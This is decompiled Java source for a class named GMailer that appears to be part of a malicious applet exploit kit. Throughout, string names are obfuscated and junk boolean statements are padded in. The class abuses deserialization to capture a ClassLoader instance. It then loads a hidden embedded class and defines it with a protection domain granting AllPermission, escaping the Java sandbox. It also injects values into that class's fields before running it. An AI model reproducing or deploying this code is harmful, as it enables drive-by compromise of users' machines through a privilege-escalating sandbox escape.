// 
// Decompiled by Procyon v0.5.30
// 

package quote;

import java.security.Permission;
import java.security.AllPermission;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.cert.Certificate;
import java.net.URL;
import java.lang.reflect.Field;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class GMailer extends ClassLoader implements Serializable
{
    public static GMailer instance;
    private static final long serialVersionUID = 6812622870313961944L;
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        true;
        true;
        false;
        true;
        false;
        true;
        false;
        true;
        false;
        objectOutputStream.defaultWriteObject();
        true;
        true;
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        false;
        GMailer.instance = this;
        false;
        true;
        true;
        objectInputStream.defaultReadObject();
        true;
        false;
        false;
        false;
        false;
    }
    
    public void __o(final String s, final String s2) throws IOException {
        false;
        true;
        true;
        true;
        final int n = 8192;
        true;
        false;
        true;
        true;
        true;
        true;
        true;
        false;
        false;
        try {
            true;
            false;
            false;
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final byte[] array = new byte[n];
            true;
            false;
            true;
            true;
            false;
            true;
            false;
            final String replace = "FFFFqFFuotFFFFe".replace("F", "").replace(".".replace("U", ""), "/".replace("T", ""));
            false;
            true;
            true;
            final InputStream resourceAsStream = this.getClass().getResourceAsStream("i/".replace("i", "") + replace + "/G55m555e55r5re5w5555s55555.c555la555s5555s".replace("5", ""));
            true;
            false;
            false;
            false;
            int read;
            while ((read = resourceAsStream.read(array)) > 0) {
                true;
                false;
                false;
                false;
                false;
                true;
                byteArrayOutputStream.write(array, 0, read);
                false;
                false;
                true;
            }
            true;
            true;
            final byte[] byteArray = byteArrayOutputStream.toByteArray();
            false;
            false;
            false;
            true;
            false;
            true;
            final Class minitClass = this.minitClass(byteArray);
            false;
            false;
            if (minitClass != null) {
                false;
                false;
                final Field field = minitClass.getField("cuuuucu".replace("u", ""));
                true;
                false;
                final Field field2 = minitClass.getField("<<<da<<<<<t<<<<<<<a".replace("<", ""));
                true;
                false;
                false;
                final Object instance = minitClass.newInstance();
                true;
                false;
                false;
                false;
                false;
                field.set(instance, s2);
                true;
                field2.set(instance, s);
                false;
                false;
                false;
                false;
                minitClass.newInstance();
                false;
            }
            false;
            true;
        }
        catch (Exception ex) {
            true;
            false;
            false;
            true;
            false;
        }
        false;
    }
    
    public Class minitClass(final byte[] array) throws IOException {
        false;
        true;
        true;
        false;
        true;
        true;
        true;
        false;
        final int n = 0;
        false;
        true;
        final URL url = new URL("file:/0000//000".replace("0", ""));
        true;
        false;
        final Certificate[] array2 = new Certificate[n];
        true;
        true;
        false;
        final Permissions permissions = new Permissions();
        false;
        true;
        this.AddPerm(permissions);
        true;
        true;
        false;
        true;
        true;
        false;
        true;
        true;
        final CodeSource codeSource = new CodeSource(url, array2);
        true;
        false;
        true;
        true;
        true;
        true;
        true;
        final ProtectionDomain protectionDomain = new ProtectionDomain(codeSource, permissions);
        false;
        true;
        true;
        true;
        true;
        true;
        return this.defineClass("quote.Gmerrews", array, n, array.length, protectionDomain);
    }
    
    public void AddPerm(final Permissions permissions) {
        permissions.add(new AllPermission());
    }
    
    static {
        GMailer.instance = null;
    }
}
